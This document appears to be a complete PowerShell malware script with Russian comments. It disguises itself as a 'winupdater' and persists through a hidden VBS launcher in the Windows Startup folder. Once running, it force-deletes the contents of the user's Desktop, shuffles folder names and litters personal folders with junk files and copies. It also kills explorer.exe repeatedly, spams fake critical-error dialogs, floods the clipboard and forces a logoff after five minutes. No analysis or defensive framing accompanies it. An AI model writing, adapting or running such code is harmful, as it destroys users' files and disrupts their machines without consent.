# === Конфигурация путей ===
$targetDir = "$env:APPDATA\Microsoft\Windows\winupdater"
$targetPs1 = "$targetDir\winupdater.ps1"
$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.vbs"

# === Если не запущен из целевой папки — копируем себя и запускаем оттуда ===
if ($MyInvocation.MyCommand.Path -ne $targetPs1) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $targetPs1 -Force

    $vbs = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -windowstyle hidden -ExecutionPolicy Bypass -File ""$targetPs1""", 0
"@
    Set-Content -Path $vbsPath -Value $vbs -Encoding ASCII

    Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    exit
}

# === Основная движуха начинается тут ===

# Удалить всё с рабочего стола
Remove-Item "$env:USERPROFILE\Desktop\*" -Recurse -Force -ErrorAction SilentlyContinue

# Перемешать названия папок на рабочем столе
$folders = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
$names = $folders.Name | Sort-Object {Get-Random}
for ($i = 0; $i -lt $folders.Count; $i++) {
    Rename-Item $folders[$i].FullName -NewName "temp_$i"
}
$renamed = Get-ChildItem "$env:USERPROFILE\Desktop" -Directory
for ($i = 0; $i -lt $renamed.Count; $i++) {
    Rename-Item $renamed[$i].FullName -NewName $names[$i]
}

# Копии файлов и действия в других папках
$targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures")
foreach ($t in $targets) {
    if (Test-Path $t) {
        Get-ChildItem $t -File | ForEach-Object {
            Copy-Item $_.FullName -Destination "$t\$($_.BaseName)_COPY$($_.Extension)" -Force
        }
    }
}

# Перевернуть экран
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{%DOWN}')

# explorer.exe убийство
Start-Job -ScriptBlock {
    while ($true) { taskkill /f /im explorer.exe; Start-Sleep 5 }
}

# Блокировка клавиатуры
Start-Job -ScriptBlock {
    $wsh = New-Object -ComObject WScript.Shell
    while ($true) { $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 100 }
}

# Вложенные папки
Start-Job -ScriptBlock {
    $path = "$env:USERPROFILE\Desktop\maze"
    for ($i=0;$i -lt 100;$i++) {
        $path += "\$i"
        New-Item -Path $path -ItemType Directory -Force | Out-Null
    }
}

# Спам сообщениями
Add-Type -AssemblyName PresentationFramework
Start-Job -ScriptBlock {
    while ($true) {
        [System.Windows.MessageBox]::Show('System Error! Contact your Admin!','Critical Error','OK','Error') | Out-Null
        Start-Sleep -Milliseconds 500
    }
}

# Мусорные файлы
Start-Job -ScriptBlock {
    for ($i=0;$i -lt 500;$i++) {
        $folder = Get-Random -InputObject $targets
        New-Item "$folder\garbage_$i.txt" -Value "LOL" | Out-Null
    }
}

# Мусор в буфере
Start-Job -ScriptBlock {
    while ($true) {
        Set-Clipboard -Value ('HAHAHA'*(Get-Random -Minimum 100 -Maximum 1000))
        Start-Sleep -Milliseconds 100
    }
}

# Выход через 5 минут
Start-Sleep -Seconds 300
shutdown /l /f
